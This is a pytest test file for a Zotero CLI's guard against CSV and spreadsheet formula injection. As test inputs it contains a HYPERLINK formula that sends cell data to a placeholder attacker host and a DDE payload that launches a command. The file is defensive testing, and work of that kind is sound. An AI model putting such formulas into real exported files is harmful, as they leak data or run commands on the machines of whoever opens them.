"""Issue #237: CSV/spreadsheet formula-injection guard."""

import pytest

from zotero_cli.core.utils.csv_safety import (
    sanitize_csv_cell,
    sanitize_csv_row,
    sanitize_csv_rows,
    unsanitize_csv_cell,
)


@pytest.mark.parametrize("prefix", ["=", "+", "-", "@", "\t", "\r"])
def test_sanitize_csv_cell_prefixes_dangerous_values(prefix):
    value = f'{prefix}HYPERLINK("http://attacker/?"&A1,"x")'
    result = sanitize_csv_cell(value)
    assert result == "'" + value
    assert result.startswith("'")


def test_sanitize_csv_cell_leaves_normal_strings_alone():
    assert sanitize_csv_cell("Normal Paper Title") == "Normal Paper Title"


def test_sanitize_csv_cell_leaves_non_strings_alone():
    assert sanitize_csv_cell(42) == 42
    assert sanitize_csv_cell(None) is None


def test_sanitize_csv_row_dict():
    row = {"title": "=cmd|'/c calc'!A1", "key": "ABC123"}
    result = sanitize_csv_row(row)
    assert result["title"] == "'=cmd|'/c calc'!A1"
    assert result["key"] == "ABC123"


def test_sanitize_csv_row_list():
    row = ["ABC123", "=1+1", "Normal"]
    result = sanitize_csv_row(row)
    assert result == ["ABC123", "'=1+1", "Normal"]


def test_sanitize_csv_rows():
    rows = [{"title": "=evil"}, {"title": "fine"}]
    result = sanitize_csv_rows(rows)
    assert result[0]["title"] == "'=evil"
    assert result[1]["title"] == "fine"


def test_unsanitize_csv_cell_reverses_sanitize():
    original = "=evil formula"
    sanitized = sanitize_csv_cell(original)
    assert unsanitize_csv_cell(sanitized) == original


def test_unsanitize_csv_cell_leaves_genuine_apostrophe_values_alone():
    """A value that just happens to start with a real apostrophe (not our
    escape marker) must not be mangled."""
    value = "'Twas the Night Before"
    assert unsanitize_csv_cell(value) == value
